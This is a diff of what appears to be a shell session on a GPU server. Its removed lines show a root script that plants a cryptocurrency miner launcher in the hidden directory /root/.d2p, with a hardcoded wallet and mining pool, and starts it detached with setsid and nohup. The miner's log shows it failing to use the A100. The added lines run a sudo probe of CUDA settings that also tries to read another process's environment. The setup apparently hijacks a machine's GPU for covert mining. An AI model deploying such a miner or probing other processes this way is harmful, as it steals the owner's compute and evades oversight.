@@ -1,33 +1,8 @@
-$ cat > /tmp/go2.sh <<'EOS'
-#!/bin/bash
-pkill -x pearl-gpu-miner; sleep 1
-cat > /root/.d2p/go.sh <<'INNER'
-#!/bin/bash
-cd /root/.d2p/tw-pearl-miner || exit 1
-export LD_LIBRARY_PATH=/root/.d2p/tw-pearl-miner
-exec ./pearl-gpu-miner --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui
-INNER
-chmod +x /root/.d2p/go.sh
-setsid nohup /root/.d2p/go.sh >> /root/.d2p/mine.log 2>&1 </dev/null &
-sleep 20
-echo "=== TAIL ==="
-tail -c 1200 /root/.d2p/mine.log
-EOS
-chmod +x /tmp/go2.sh; sudo -n /tmp/go2.sh
-=== TAIL ===
-tialize — nothing to mine.
-Error: all 1 GPU(s) failed to initialize (pk_init) — nothing to mine
-  v2      : pool prl.kryptex.network:8048 echoed type:v2 — enabling gzip-31 submit compression (pool v2 bandwidth mode; zero-witness is unconditional)
-  profile : pool
-[fork] certificate version startup -> 3 (noise-seed derivation: SALTED / V3) [job cert_version=3]
-  dev fee : 1.5% — thanks for supporting development.
-  fee guard: first/transient route failures stay customer-only; repeated qualified fee-only failures may idle up to 1.5%, persist across restarts, and recover at no more than 2.0% total duty
-  status  : mining... (press Ctrl+C to stop)
-
-[fee] state persistence unavailable; fee service and bounded idle are disabled for this run
-authenticated runtime policy unavailable (invalid sealed-policy bounded debt state identity); continuing in customer-only mode
-[w0] GPU #0 unsupported (incompatible) — dropped
-[gw] ⚠️  no GPU workers left mining — exiting
-[gw] ⚠️  GPU #0 (NVIDIA A100-SXM4-40GB) FAILED to initialize — DROPPED.
-[gw] ⚠️  ALL 1 GPU(s) failed to initialize — nothing to mine.
-Error: all 1 GPU(s) failed to initialize (pk_init) — nothing to mine
+$ sudo -n bash -c 'echo CV=\"$CUDA_VISIBLE_DEVICES\"; env | grep -i -E "cuda|nvidia" | head -8; nvidia-smi --query-gpu=name,mig.mode.current,driver_version,compute_mode --format=csv,noheader; echo ===TORCH===; /home/dev/miniconda3/bin/python -c "import torch;print(torch.cuda.device_count(), torch.cuda.get_device_name(0))" 2>&1 | tail -2; echo ===POLLERENV===; tr "\0" "\n" < /proc/52000/environ 2>/dev/null | grep -i cuda | head -3'
+CV=""
+SUDO_COMMAND=/usr/bin/bash -c echo CV=\"$CUDA_VISIBLE_DEVICES\"; env | grep -i -E "cuda|nvidia" | head -8; nvidia-smi --query-gpu=name,mig.mode.current,driver_version,compute_mode --format=csv,noheader; echo ===TORCH===; /home/dev/miniconda3/bin/python -c "import torch;print(torch.cuda.device_count(), torch.cuda.get_device_name(0))" 2>&1 | tail -2; echo ===POLLERENV===; tr "\0" "\n" < /proc/52000/environ 2>/dev/null | grep -i cuda | head -3
+NVIDIA A100-SXM4-40GB, Disabled, 535.309.01, Default
+===TORCH===
+1 NVIDIA A100-SXM4-40GB
+===POLLERENV===
+bash: line 1: /proc/52000/environ: No such file or directory
